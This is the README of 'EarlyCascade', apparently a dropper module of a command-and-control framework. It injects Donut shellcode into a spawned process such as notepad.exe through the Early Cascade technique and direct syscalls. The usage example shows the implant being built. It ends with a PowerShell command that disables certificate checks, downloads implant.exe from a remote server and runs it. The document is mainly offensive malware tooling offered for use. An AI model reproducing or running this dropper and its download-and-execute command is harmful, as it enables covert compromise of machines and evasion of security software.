# EarlyCascade

This project is part of the [Exploration C2 Framework](https://github.com/maxDcb/C2TeamServer)

Dropper that use Early Cascade technique [EarlyCascade](https://github.com/0xNinjaCyclone/EarlyCascade) to inject a shellcode generated with [Donut](https://github.com/TheWover/donut). The injection process use syscall inspiered by [SysWhispers3](https://github.com/klezVirus/SysWhispers3). 


```
python3 EarlyCascade.py -p notepad.exe -u https://10.10.10.10:8000 -b ./BeaconHttp.exe -a "10.10.10.10 8443 https"
[+] Parse url:
 Schema: https
 IP Address: 10.10.10.10
 Port: 8000
 Full Location: /JGWOEYVI72UCI9X
 shellcodeFile: JGWOEYVI72UCI9X
 Process to start: notepad.exe

[+] Generate shellcode to fetch with donut:
 ...


[+] Compile injector with informations
generate cryptDef.h with given input 
 compile injector 


[+] Check generated files

[+] Done

[+] Dropper path  :  ['./EarlyCascade/bin/implant.exe']
[+] Shellcode path:  ['./EarlyCascade/bin/JGWOEYVI72UCI9X']
[+] Command to run:  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('https://10.10.10.10:8000/implant.exe',(Get-Location).Path+'\test.exe'); Start-Process test.exe;

```